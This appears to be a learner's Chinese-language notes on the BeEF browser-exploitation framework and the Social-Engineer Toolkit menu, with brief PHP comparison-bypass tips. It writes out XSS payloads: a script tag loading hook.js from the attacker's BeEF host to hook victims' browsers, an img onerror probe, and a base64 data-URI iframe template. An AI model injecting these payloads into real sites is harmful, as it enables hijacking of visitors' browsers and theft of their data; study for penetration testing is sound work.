beef xss攻击框架 （beef beef）

​	原理:

​		向网页中插入一段hook.js的脚本代码，如果被攻击方访问了这个页面被攻击方就会被这个钩子钩住，然后在攻击方beef的服务器上上线

​	攻击的方式

​			在存在xss漏洞的主机上访问

​			<script src="http://BeEF主机-IP:3000/hook.js"></script>beef服务端被害人上线

​	页面左侧为在线的主机和不在线的主机

​		online browsers

​		offline browsers

​	details是浏览器的信息详情

​	logs能记录在浏览器上的操作

​	commands你能对浏览器的操作

​			绿色和橙色（能被用户发现）表明攻击模块可用灰色待验证红色为不可用

​	在存在跨站点的地方输入<img src=x onerror=alert(1); />会回弹一个图片 鼠标移到图片上会回弹一个1

	    <iframe src="data:text/html;base64,这里加你的经过base64加密过的脚本代码"></iframe>

set攻击

​	菜单 

​		1 社会工程学攻击



​						![捕获1](C:\Users\hasee\Desktop\捕获1.PNG)



​		

​		2 是Fast-Track渗透测试（自动化的漏洞攻击 如自动化的查询注入）	

​						![捕获2](C:\Users\hasee\Desktop\捕获2.PNG)

​		3 第三方模块

​		4 升级

​		5 升级配置

​		6 帮助	



get传参就为urlcode  strcmp 数组和字符串能够相等 ereg（）函数存在%00截断漏洞  MD5存在数组相等的漏洞

​	

​	